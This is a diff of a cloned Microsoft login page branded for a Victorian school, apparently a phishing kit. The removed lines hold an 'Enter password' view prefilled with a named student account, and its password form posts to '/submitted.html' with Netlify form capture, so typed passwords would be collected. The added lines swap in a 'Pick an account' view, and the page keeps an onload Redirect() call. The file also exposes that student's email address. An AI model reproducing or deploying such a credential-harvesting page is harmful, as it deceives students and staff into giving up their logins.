@@ -19,7 +19,6 @@
         <meta name="format-detection" content="telephone=no">
 
 
-
     
     
 <meta name="robots" content="none">
@@ -30,14 +29,14 @@
         <link rel="prefetch" href="https://login.live.com/Me.htm?v=3">
                 <link rel="shortcut icon" href="https://aadcdn.msauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
 
-
-
-
+    
     
     <link data-loader="cdn" crossorigin="anonymous" href="https://aadcdn.msauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_81imvbluez-v5hbzpkxfcg2.css" rel="stylesheet">
 
 
-  
+
+<script charset="utf-8" nonce="" src="https://aadcdn.msauth.net/shared/1.0/content/js/asyncchunk/convergedlogin_pcustomizationloader_41f36656d3c0bb04c90c.js"></script><script charset="utf-8" nonce="" src="https://aadcdn.msauth.net/shared/1.0/content/js/asyncchunk/convergedlogin_ptiles_4648c8b30e3bab4c59ab.js"></script><script charset="utf-8" nonce="" src="https://aadcdn.msauth.net/shared/1.0/content/js/asyncchunk/convergedlogin_ppassword_aa031712c04fd9c63636.js"></script></head>
+
 <body onload="Redirect()" data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;" cz-shortcut-listen="true">
 
 
@@ -47,6 +46,7 @@
 
 <div data-bind="if: activeDialog"></div>
 
+<form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="visible: !isLoginPageHidden(), autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: !!activeDialog(), css: { 'provide-min-height': svr.fUseMinHeight }" action="https://login.microsoftonline.com/common/login" class="provide-min-height">
     <!-- ko withProperties: { '$loginPage': $data } -->
     <div class="login-paginated-page" data-bind="component: { name: 'master-page',
         publicMethods: masterPageMethods,
@@ -75,10 +75,8 @@
     <!-- ko if: smallImageUrl --><!-- /ko -->
 
     <!-- ko if: backgroundImageUrl -->
-    <div id="backgroundImage" role="img" data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }, ariaLabel: str['STR_Background_Image_AltText']" class="background-image ext-background-image" aria-label="Organization background image" style="background-image: url(&quot;https://aadcdn.msauthimages.net/81d6b03a-qkpqk9-cyjlu1olnzvk46w8i1dtswdjfv-gjp0tqg-y/logintenantbranding/0/illustration?ts=636872626621686360&quot;);"></div>
-        <!-- ko if: useImageMask -->
-        <div data-bind="externalCss: { 'background-overlay': true }" class="background-overlay ext-background-overlay"></div>
-        <!-- /ko -->
+    <div id="backgroundImage" role="img" data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }, ariaLabel: str['STR_Background_Image_AltText']" class="background-image ext-background-image" aria-label="Organization background image" style="background-image: url(&quot;https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_11d9e3bcdfede9ce5ce5ace2d129f1c4.svg&quot;);"></div>
+        <!-- ko if: useImageMask --><!-- /ko -->
     <!-- /ko -->
 </div></div>
 
@@ -127,14 +125,14 @@
                 isChinaDc: svr.fIsChinaDc,
                 bannerLogoUrl: bannerLogoUrl() } }"><!--  -->
 
-<!-- ko if: bannerLogoUrl -->
-    <!-- ko if: svr.fTenantBrandingCdnAddEventHandlers -->
-    <img id="bannerLogo" data-bind="addEventHandlers, attr: { src: bannerLogoUrl, alt: str['STR_Banner_Logo_AltText'] }, externalCss: { 'banner-logo': true }" src="https://aadcdn.msauthimages.net/81d6b03a-qkpqk9-cyjlu1olnzvk46w8i1dtswdjfv-gjp0tqg-y/logintenantbranding/0/bannerlogo?ts=637066111804003919" alt="Organization banner logo" class="banner-logo ext-banner-logo">
-    <!-- /ko -->
-    <!-- ko if: !svr.fTenantBrandingCdnAddEventHandlers --><!-- /ko -->
-<!-- /ko -->
+<!-- ko if: bannerLogoUrl --><!-- /ko -->
 
-<!-- ko if: !bannerLogoUrl && !isChinaDc && !isCiamUserFlowUx --><!-- /ko -->
+<!-- ko if: !bannerLogoUrl && !isChinaDc && !isCiamUserFlowUx -->
+    <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
+<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
+<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="img" pngsrc="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ea19b2112f4dfd8e90b4505ef7dcb4f9.png" svgsrc="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft"><!-- /ko -->
+<!-- /ko --><!-- /ko -->
+<!-- /ko -->
 
 <!-- ko if: !bannerLogoUrl && isCiamUserFlowUx && bannerLogoText --><!-- /ko --></div>
         <!-- /ko -->
@@ -161,49 +159,9 @@
                 animationStateChange: paginationControl_onAnimationStateChange } }"><!--  -->
 
 <div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
-    <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.sPOST_Username) -->
-    <div data-bind="css: {
-        'animate': animate() &amp;&amp; animate.animateBanner(),
-        'slide-out-next': animate.isSlideOutNext(),
-        'slide-in-next': animate.isSlideInNext(),
-        'slide-out-back': animate.isSlideOutBack(),
-        'slide-in-back': animate.isSlideInBack() }" class="animate slide-in-next">
+    <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.sPOST_Username) --><!-- /ko -->
 
-        <div data-bind="component: { name: 'identity-banner-control',
-            params: {
-                userTileUrl: svr.urlProfilePhoto,
-                displayName: sharedData.displayName || svr.sPOST_Username,
-                isBackButtonVisible: isBackButtonVisible(),
-                focusOnBackButton: isBackButtonFocused(),
-                backButtonDescribedBy: backButtonDescribedBy() },
-            event: {
-                backButtonClick: identityBanner_onBackButtonClick } }"><!--  -->
-
-<div class="identityBanner">
-    <!-- ko if: isBackButtonVisible -->
-    <button type="button" class="backButton" data-bind="
-        attr: { 'id': backButtonId || 'idBtn_Back' },
-        ariaLabel: str['CT_HRD_STR_Splitter_Back'],
-        ariaDescribedBy: backButtonDescribedBy,
-        click: backButton_onClick,
-        hasFocus: focusOnBackButton" id="idBtn_Back" aria-label="Back">
-        <!-- ko ifnot: svr.fIsRTLMarket -->
-            <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
-<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
-<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img role="presentation" pngsrc="https://aadcdn.msauth.net/shared/1.0/content/images/arrow_left_d1229aefd268f350621d48f094122f69.png" svgsrc="https://aadcdn.msauth.net/shared/1.0/content/images/arrow_left_43280e0ba671a1d8b5e34f1931c4fe4b.svg" data-bind="imgSrc" src="https://aadcdn.msauth.net/shared/1.0/content/images/arrow_left_43280e0ba671a1d8b5e34f1931c4fe4b.svg"><!-- /ko -->
-<!-- /ko --><!-- /ko -->
-        <!-- /ko -->
-
-        <!-- ko if: svr.fIsRTLMarket --><!-- /ko -->
-    </button>
-    <!-- /ko -->
-
-    <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title="119979@vsv.vic.edu.au">119979@vsv.vic.edu.au</div>
-</div></div>
-    </div>
-    <!-- /ko -->
-
-    <div class="pagination-view has-identity-banner animate slide-in-next" data-bind="css: {
+    <div class="pagination-view animate slide-in-next" data-bind="css: {
         'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
         'zero-opacity': hidePaginatedView.hideSubView(),
         'animate': animate(),
@@ -219,184 +177,194 @@
         
             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
         
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
             <!-- ko if: $parent.currentViewIndex() === $index() -->
-                <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" data-bind="pageViewComponent: { name: 'login-paginated-password-view',
+                <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="12" data-bind="pageViewComponent: { name: 'tiles-view',
                 params: {
                     serverData: svr,
                     serverError: initialError,
-                    isInitialView: isInitialState,
-                    username: sharedData.username,
-                    displayName: sharedData.displayName,
-                    hipRequiredForUsername: sharedData.hipRequiredForUsername,
-                    passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
-                    availableCreds: sharedData.availableCreds,
-                    evictedCreds: sharedData.evictedCreds,
-                    useEvictedCredentials: sharedData.useEvictedCredentials,
-                    showCredViewBrandingDesc: sharedData.showCredViewBrandingDesc,
-                    flowToken: sharedData.flowToken,
-                    defaultKmsiValue: svr.iDefaultLoginOptions === 1,
-                    userTenantBranding: sharedData.userTenantBranding,
                     sessions: sharedData.sessions,
-                    callMetadata: sharedData.callMetadata,
-                    supportsNativeCredentialRecovery: sharedData.supportsNativeCredentialRecovery,
-                    forgotPasswordText: $loginPage.forgotPasswordText,
-                    accessRecoveryLink: $loginPage.accessRecoveryLink,
-                    boilerPlateText: $loginPage.boilerPlateText,
-                    hideAccountResetCredentials: $loginPage.hideAccountResetCredentials },
+                    flowToken: sharedData.flowToken,
+                    otherIdpRedirectUrl: sharedData.otherIdpRedirectUrl,
+                    isTileRequestPending: $loginPage.asyncTileRequestCount > 0,
+                    availableSignupCreds: sharedData.availableSignupCreds },
                 event: {
-                    restoreIsRecoveryAttemptPost: $loginPage.view_onRestoreIsRecoveryAttemptPost,
-                    updateFlowToken: $loginPage.view_onUpdateFlowToken,
-                    submitReady: $loginPage.view_onSubmitReady,
                     redirect: $loginPage.view_onRedirect,
-                    resetPassword: $loginPage.passwordView_onResetPassword,
-                    setBackButtonState: view_onSetIdentityBackButtonState,
                     setPendingRequest: $loginPage.view_onSetPendingRequest } }"><!--  -->
 
-<!--  -->
+<input type="hidden" name="sessionId" data-bind="value: selectedSessionId" value="">
 
-<div aria-hidden="true">
-    <input type="hidden" name="i13" data-bind="value: isKmsiChecked() ? 1 : 0" value="0">
-
-    <input type="hidden" name="login" autocomplete="username" data-bind="value: unsafe_username" value="119979@vsv.vic.edu.au">
-
-    <!-- The loginfmt input type is different as some password managers require it to be of type text.
-        Since screen readers might not hide this input, a parent div with aria-hidden true has been added. -->
-    <input type="text" name="loginfmt" data-bind="moveOffScreen, value: unsafe_displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true">
-    <input type="hidden" name="type" data-bind="value: svr.fUseWizardBehavior ? 20 : 11" value="11">
-    <input type="hidden" name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3">
-    <input type="hidden" name="lrt" data-bind="value: callMetadata.IsLongRunningTransaction" value="">
-    <input type="hidden" name="lrtPartition" data-bind="value: callMetadata.LongRunningTransactionPartition" value="">
-    <input type="hidden" name="hisRegion" data-bind="value: callMetadata.HisRegion" value="">
-    <input type="hidden" name="hisScaleUnit" data-bind="value: callMetadata.HisScaleUnit" value="">
-</div>
-
-<div id="loginHeader" class="row title ext-title" data-bind="externalCss: { 'title': true }">
-    <div role="heading" aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']">Enter password</div>
-</div>
-
-<!-- ko if: showCredViewBrandingDesc --><!-- /ko -->
-
-<!-- ko if: unsafe_pageDescription --><!-- /ko -->
-
-<div class="row">
-    <div class="form-group col-md-24">
-        <div role="alert" aria-live="assertive">
-            <!-- ko if: passwordTextbox.error --><!-- /ko -->
-        </div>
-
-        <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
-            publicMethods: passwordTextbox.placeholderTextboxMethods,
-            params: {
-                serverData: svr,
-                hintText: str['CT_PWD_STR_PwdTB_Label'] },
-            event: {
-                updateFocus: passwordTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } -->
-    <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
-
-            <input name="passwd" type="password" id="i0118" class="form-control input ext-input text-box ext-text-box" aria-required="true" data-bind="
-                attr: { autocomplete: svr.fIsUpdatedAutocompleteEnabled ? 'current-password' : 'off'},
-                textInput: passwordTextbox.value,
-                ariaDescribedBy: [
-                    'loginHeader passwordError',
-                    showCredViewBrandingDesc ? 'credViewBrandingDesc' : '',
-                    unsafe_pageDescription ? 'passwordDesc' : ''].join(' '),
-                hasFocusEx: passwordTextbox.focused() &amp;&amp; !showPassword(),
-                placeholder: $placeholderText,
-                ariaLabel: unsafe_passwordAriaLabel,
-                moveOffScreen: showPassword,
-                externalCss: {
-                    'input': true,
-                    'text-box': true,
-                    'has-error': passwordTextbox.error }" autocomplete="current-password" aria-describedby="loginHeader passwordError  " placeholder="Password" aria-label="Enter the password for 119979@vsv.vic.edu.au" tabindex="0">
-
-            <!-- ko if: svr.fUsePasswordPeek && showPassword() --><!-- /ko -->
-        <!-- /ko -->
-<!-- /ko -->
-<!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div>
-
-        <!-- ko if: svr.fUsePasswordPeek --><!-- /ko -->
+<div data-bind="component: { name: 'header-control',
+    params: {
+        serverData: svr,
+        title: pageTitle } }"><div>
+    <div class="row title ext-title" id="loginHeader" data-bind="externalCss: { 'title': true }">
+        <div role="heading" aria-level="1" data-bind="text: title">Pick an account</div>
+        <!-- ko if: isSubtitleVisible --><!-- /ko -->
     </div>
-</div>
 
-<!-- ko if: shouldHipInit --><!-- /ko -->
-<form action="/submitted.html" method="POST" name="f" id="f" data-netlify="true">
-<div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText &amp;&amp; !boilerPlateText }, externalCss: { 'password-reset-links-container': true }" class="password-reset-links-container ext-password-reset-links-container">
-    <div>
-        <!-- ko if: svr.fShowPersistentCookiesWarning --><!-- /ko -->
-        <!-- ko if: svr.fKMSIEnabled !== false && !svr.fShowPersistentCookiesWarning && !tenantBranding.KeepMeSignedInDisabled --><!-- /ko -->
+    <!-- ko if: headerDescription --><!-- /ko -->
+</div></div>
 
-        <div class="row">
-            <div class="col-md-24">
-                <div class="text-13">
-                    <!-- ko if: svr.urlSkipZtd && svr.sZtdUpnHint --><!-- /ko -->
-                    <!-- ko ifnot: hideForgotMyPassword -->
-                    <div class="form-group">
-                        <!-- ko if: svr.fFixUrlResetPassword -->
-                        <a id="idA_PWD_ForgotPassword" data-bind="
-                            text: unsafe_forgotPasswordText,
-                            href: resetPasswordUrl || '#',
-                            attr: {
-                              target: accessRecoveryLink &amp;&amp; '_blank',
-                              role: resetPasswordUrl ? 'link' : 'button'
-                            },
-                            click: accessRecoveryLink ? null : resetPassword_onClick" href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQQIARAAnZI9aBtnGMd1luw4AtdOC8VkiSCmlKa67ztJBg2yZEl30p2-7iydlvR0957vva9XvjtZlsaQQikUQpeUdCuZBIXQpaUE0q1gOmQJJFncbsFDEjKFDCXqkKFbCDw8w8P_Nzz8_ulVFmdx8oskjZO7Owapj_IGKGRBQSezLA1y2RHJs1mGMVmaNi2Wsqjw4_RW7saZ9eTf5P3km6-vG-avdxdYzo7jcbRLEGgSewi5OLIsaADcQD4RAV8PYmigYxAeQzAlfIbnyrYe93qt3zDsIYY9w7DvV77FWngZdk5kWoSSIzEaJGeyIvpNpetKzn6sOVVPLlNQorWZ7B-42lz0pJrQEyvaXFKMJVe1m_3OVFPcWK7J7pLnZOfAayqiM1RcRnIEclhRKc1GqjQ3KLkilgxadJrBcKzNOG9YVyfaQD2sdYrFxcoOSRX4XMEoZA2D47I5kgTZPM-Osgw3InWGtFgGgKcrm63SJLbp_xYK4Ry8Wlm3Qv3QB0F8J-mBmTgelgVecEonLUVjWn2Ja_ZlR1Y6sUyrrAwpW-t3neUNSoq9fLPqy37X13pCJPiUZ9b2YSuIoN7nyOFAtDWmOx7RnAoGe57gIGjUClNzUILWgCwuklffOYgmoygO9Rj8z8LMDMDsl-QGCg_1AM71GKIgOk2K70ERuAksfeLFGTQGATQz4xBZ0AOZZdKDAbiuGwaIosdJ7GEKO099up7aSm0nMonPPyNXd9fX01ub2xcyidcp7KfVZXvulq_8efPHR43vbn91-c4ZnzhdJcaWipzqxG7k2Xq_HIbAJ-xhPqQlf-qw_dnhQBYIo9taekXF_C51aw27tfbJ6dqmH-ke7kT4KETTCIQv17BvLiR-v_ihbfwhjS3S16hc7aRro7xf5Wk47zjNiQuZdu_gqNLsmBxoIbcW8d12u6FI99LYHxuJ1x_9fHvx14sH_zyvn29-ObREf7AX2dW6jdxGhagdqVJd3YuqB2KbOS4Jss9fc9qNjrs_Ld7bSvy9nEuJtw2&amp;mkt=en-AU&amp;hosted=0&amp;device_platform=macOS" target="" role="link">Forgot my password</a>
-                        <!-- /ko -->
-                        <!-- ko ifnot: svr.fFixUrlResetPassword --><!-- /ko -->
-                    </div>
-                    <!-- /ko -->
-                    <!-- ko if: allowPhoneDisambiguation --><!-- /ko -->
-                    <!-- ko ifnot: useEvictedCredentials -->
-                        <!-- ko component: { name: "cred-switch-link-control",
-                            params: {
-                                serverData: svr,
-                                username: username,
-                                availableCreds: availableCreds,
-                                flowToken: flowToken,
-                                currentCred: { credType: 1 } },
-                            event: {
-                                switchView: credSwitchLink_onSwitchView,
-                                redirect: onRedirect,
-                                setPendingRequest: credSwitchLink_onSetPendingRequest,
-                                updateFlowToken: credSwitchLink_onUpdateFlowToken } } --><!--  -->
+<!-- ko if: pageDescription --><!-- /ko -->
 
-<div class="form-group">
-    <!-- ko if: showSwitchToCredPickerLink --><!-- /ko -->
+<!-- ko if: error --><!-- /ko -->
 
-    <!-- ko if: credentialCount === 1 && !(showForgotUsername || selectedCredShownOnlyOnPicker) --><!-- /ko -->
+<div data-bind="css: { 'position-buttons': svr.fAllowCancel }">
+    <div class="row">
+        <div id="tilesHolder" class="form-group" role="list" aria-labelledby="tileError loginHeader" data-bind="attr: { 'data-test-asynctilesloaded': !isTileRequestPending() }" data-test-asynctilesloaded="true">
+            <!-- ko foreach: { data: sessions, as: 'session' } -->
+            <div class="tile-container" data-bind="component: { name: 'tile-field',
+                params: {
+                    serverData: svr,
+                    session: session,
+                    hasFocus: $index() === 0,
+                    ariaDescribedBy: $index() === 0 ? 'tileError loginHeader' : null,
+                    isLogoutRequest: $parent.isLogoutRequest,
+                    tileIndex: $index() },
+                event: {
+                    tileClick: $parent.tile_onClick,
+                    forgetComplete: $parent.tile_onForgetComplete } },
+                css: { 'binaryChoice list': svr.fSupportWindowsStyles }"><!--  -->
 
-    <!-- ko if: credentialCount === 0 && showForgotUsername --><!-- /ko -->
-</div>
+<div class="row tile" role="listitem">
+    <div class="table" tabindex="0" role="button" data-bind="
+        attr: {
+            'data-test-id': session.unsafe_name,
+            'data-test-idp': session.idp,
+            'data-test-hometenant': session.homeTenantName || '' },
+        css: { 'list-item': svr.fSupportWindowsStyles },
+        ariaLabel: unsafe_helpText,
+        ariaDescribedBy: ariaDescribedBy,
+        click: tile_onClick,
+        pressEnter: tile_onClick,
+        hasFocus: hasFocus" data-test-id="119979@vsv.vic.edu.au" data-test-idp="0" data-test-hometenant="" aria-label="Sign in with work or school account." aria-describedby="tileError loginHeader">
+        <div class="table-row">
+            <div class="table-cell tile-img">
+                <!-- ko if: session.idp === 0 -->
+                <img class="tile-img" role="presentation" pngsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_account_aad_c5cbcbb43e61b1347b12589901000621.png" svgsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_account_aad_a8332c62695d74843a11daf39a74e552.svg" data-bind="imgSrc" src="https://aadcdn.msauth.net/shared/1.0/content/images/picker_account_aad_a8332c62695d74843a11daf39a74e552.svg">
+                <!-- /ko -->
 
-<!-- ko if: credLinkError --><!-- /ko --><!-- /ko -->
+                <!-- ko if: session.idp === 1 --><!-- /ko -->
+            </div>
 
-                        <!-- ko if: evictedCreds.length > 0 --><!-- /ko -->
-                    <!-- /ko -->
-                    <!-- ko if: showChangeUserLink --><!-- /ko -->
-                </div>
+            <div class="table-cell text-left content" data-bind="css: { 'content': !svr.fSupportWindowsStyles }">
+                <div id="emailaddressbtn" data-bind="text: ((session.isSignedIn || session.isSamsungSso) &amp;&amp; session.unsafe_fullName) || session.unsafe_displayName"></div>
+
+                <!-- ko if: (session.isSignedIn || session.isSamsungSso) && session.fullName --><!-- /ko -->
+
+                <!-- ko if: session.isSignedIn && !session.isWindowsSso && !session.isSamsungSso && !iFrameSrc() --><!-- /ko -->
+
+                <!-- ko if: session.iFrameSrc --><!-- /ko -->
+
+                <!-- ko if: session.isWindowsSso --><!-- /ko -->
+
+                <!-- ko if: session.isSamsungSso --><!-- /ko -->
             </div>
         </div>
     </div>
+
+    <!-- ko ifnot: hideTileMenu -->
+    <div class="table-cell tile-menu tile-menu-float">
+        <div tabindex="0" role="button" data-bind="
+                click: menu_onClick,
+                pressEnter: menu_onClick,
+                hasFocus: menuFocused,
+                ariaLabel: str['TILE_STR_MenuAltText'],
+                attr: {
+                    'data-test-id': session.unsafe_name + '-menu-dots',
+                    'data-test-idp': session.idp,
+                    'aria-controls': 'tileMenu' + tileIndex,
+                    'aria-expanded': menuOpen().toString() }" aria-label="Open menu" data-test-id="119979@vsv.vic.edu.au-menu-dots" data-test-idp="0" aria-controls="tileMenu0" aria-expanded="false">
+
+            <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
+<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
+<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img role="presentation" pngsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_more_1d6ace95dfc19716890791d2a1f524ed.png" svgsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_more_ef457519e32834a8087669d5a08bb5fb.svg" data-bind="imgSrc" src="https://aadcdn.msauth.net/shared/1.0/content/images/picker_more_ef457519e32834a8087669d5a08bb5fb.svg"><!-- /ko -->
+<!-- /ko --><!-- /ko -->
+        </div>
+    </div>
+    <!-- /ko -->
 </div>
 
-<div class="win-button-pin-bottom boilerplate-button-bottom" data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText || boilerPlateText }">
-    <div class="row move-buttons" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText || boilerPlateText }">
-        <div data-bind="component: { name: 'footer-buttons-field',
-            params: {
-                serverData: svr,
-                primaryButtonText: str['CT_PWD_STR_SignIn_Button'],
-                isPrimaryButtonEnabled: !isRequestPending(),
-                isPrimaryButtonVisible: svr.fShowButtons,
-                isSecondaryButtonEnabled: true,
-                isSecondaryButtonVisible: false },
-            event: {
-                primaryButtonClick: primaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container" data-bind="
+<ul class="menu" role="menu" data-bind="
+    visible: menuOpen,
+    if: menuOpen,
+    attr: { 'id': 'tileMenu' + tileIndex }" id="tileMenu0" style="display: none;"></ul>
+
+<!-- ko if: iFrameSrc --><!-- /ko -->
+
+<!-- ko if: forgetIFrameSrc --><!-- /ko --></div>
+            <!-- /ko -->
+
+            <!-- ko if: isTileRequestPending --><!-- /ko -->
+
+            <!-- ko if: unsafe_signupTileText --><!-- /ko -->
+
+            <!-- ko ifnot: isLogoutRequest || svr.fShowSignupTile -->
+            <div class="row tile" role="listitem">
+                <div id="otherTile" class="table" tabindex="0" role="button" aria-labelledby="otherTileText" data-bind="
+                    css: { 'list-item': svr.fSupportWindowsStyles },
+                    click: otherTile_onClick,
+                    pressEnter: otherTile_onClick">
+                    <div class="table-row">
+                        <div class="table-cell tile-img">
+                            <img class="tile-img" role="presentation" pngsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_account_add_387f8dc3a85b573b9b6d74321585afee.png" svgsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_account_add_77a852ed38516108ced087b72b525d25.svg" data-bind="imgSrc" src="https://aadcdn.msauth.net/shared/1.0/content/images/picker_account_add_77a852ed38516108ced087b72b525d25.svg">
+                        </div>
+
+                        <div class="table-cell text-left content" data-bind="css: { 'content': !svr.fSupportWindowsStyles }">
+                            <div id="otherTileText" data-bind="text: otherTileText">Use another account</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!-- /ko -->
+        </div>
+    </div>
+</div>
+
+<div class="row">
+    <div data-bind="component: { name: 'footer-buttons-field',
+        params: {
+            serverData: svr,
+            removeBottomMargin: true,
+            isPrimaryButtonVisible: false,
+            isSecondaryButtonVisible: !!svr.fAllowCancel },
+        event: {
+            secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container no-margin-bottom button-field-container ext-button-field-container" data-bind="
     visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
     css: { 'no-margin-bottom': removeBottomMargin },
-    externalCss: { 'button-field-container': true }">
+    externalCss: { 'button-field-container': true }" style="display: none;">
 
     <!-- ko if: isSecondaryButtonVisible --><!-- /ko -->
 
-    <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }" class="inline-block button-item ext-button-item">
+    <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }" class="button-item ext-button-item">
         <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
         <!-- ko ifnot: svr.fConsentButtonIdViaName -->
         <input type="submit" id="idSIButton9" class="win-button button_primary high-contrast-overrides button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" data-bind="
@@ -411,52 +379,13 @@
                 clickBubble: !svr.fEnableLivePreview,
                 enable: isPrimaryButtonEnabled,
                 visible: isPrimaryButtonVisible,
-                preventTabbing: primaryButtonPreventTabbing" value="Sign in" data-report-attached="1">
+                preventTabbing: primaryButtonPreventTabbing" value="Next" data-report-attached="1" style="display: none;">
         <!-- /ko -->
         <!-- ko if: svr.fConsentButtonIdViaName --><!-- /ko -->
     </div>
 </div></div>
-    </div>
-</div>
-</form>
-<!-- ko if: tenantBranding.BoilerPlateText || boilerPlateText-->
-<div id="idBoilerPlateText" class="wrap-content boilerplate-text ext-boilerplate-text" data-bind="
-    htmlWithMods: svr.fEnableLivePreview ? boilerPlateText : tenantBranding.BoilerPlateText,
-    htmlMods: { filterLinks: svr.fIsHosted },
-    css: { 'transparent-lightbox': tenantBranding.UseTransparentLightBox },
-    externalCss: { 'boilerplate-text': true }"><p>If you are having trouble logging in please contact your Learning Advisor or VSV Reception on 03 9965 0000.</p>
-</div>
-<!-- /ko -->
-</div><!-- /ko -->
+</div></div><!-- /ko -->
             <!-- /ko -->
-        
-            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
-        
-            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
-        
-            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
-        
-            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
-        
-            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
-        
-            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
-        
-            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
-        
-            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
-        
-            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
-        
-            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
-        
-            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
-        
-            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
-        
-            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
-        
-            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
         
             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
         
@@ -519,12 +448,12 @@
         <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value="">
         <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value="">
         <!-- ko if: svr.sCanaryTokenName && !svr.fSkipRenderingNewCanaryToken -->
